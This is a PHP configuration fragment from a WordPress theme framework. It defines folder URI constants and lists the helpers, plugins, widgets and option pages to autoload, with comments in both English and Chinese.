define('KFWCLASSES_URI', 	KFW_URI . 'classes/'); 
define('KFWPLUGINS_URI', 	KFW_URI . 'theme_plugins/'); 
define('KFWWIDGET_URI', 	KFW_URI . 'theme_widgets/'); 
define('KFWINC_URI', 		KFW_URI . 'includes/'); 
define('KFWINC_SC', 		KFW_URI . 'shortcodes/'); 


##################################################################
# this include calls a file that automatically includes all
# 这里包含着一个文件可以自动包含主题中其他功能性文件
# the files within the folder framework and therefore makes 
# 这些文件都包含在framework文件夹中
# all functions and classes available for later use
# 所有的功能性质的函数和类都可以留在后面的使用
##################################################################



$autoload['helper'] = array(
							'base-funs',	# helper functions that make my developer-life easier =)helper function让我的开发过程更加轻松
							'VideoUrlParser',	# helper functions that make my developer-life easier =)helper function让我的开发过程更加轻松
							'shortcode'
							
							);

$autoload['plugins'] = array('kriesi_option_pages/kriesi_option_pages',		
							'kriesi_meta_box/kriesi_meta_box'
							);

$autoload['widgets'] = array(
							/*'advertising_widget_dual',这个地方是主题推荐，在“外观”中*/
							'sidebar_news',//侧边栏新闻
							'category-two-colomn',//两栏分类目录 
							//'special_category',//高级图库展示，忘记怎么用的
							'special_time',//提示时间。尚未配置
							'comments-new',//最新评论
							'comments-wallreaders',//读者墙
							'tags-color',//彩色标签云
							'website-statistics',//网站统计
							'three-tabs',//tab三栏
							'single-cats',//文章页分类
							'category-cats',//标签页分类
							'tag-cats',//标签页标签
							'users-cats-tags',//标签页标签
							'special_login'//登录
							/*'advertising_widget'，在小工具中添加广告空间*/
							);

$autoload['option_pages'] = array(
								'options',
								'index_page',
								'page_post',
								'sidebar_footer',
								'users_cats_tags',
								'meta_box'
								 );
								 

include_once(KFW.'/include_framework.php');



